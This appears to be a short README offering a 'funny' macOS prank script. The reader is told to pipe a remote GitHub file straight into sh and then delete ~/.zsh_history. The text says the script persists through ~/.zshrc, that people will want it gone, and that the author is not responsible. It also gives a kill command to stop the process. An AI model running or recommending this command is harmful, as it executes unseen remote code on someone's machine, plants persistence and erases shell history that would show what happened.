
Hey this is a super funnyscript which work verry well on osx !

I'm not responsible for what you do with this script so make sure you know what you're doing :)

```curl https://raw.githubusercontent.com/vimman/FunnyScript/master/System_input | sh && rm ~/.zsh_history```

Have fun !!!

By the way if you want to get rid of it (wich obviously you would like one day or another...) just use this command and clean your ~/.zshrc
```kill $(ps -A | grep preferences | grep '??' | cut -d ' ' -f 1)```
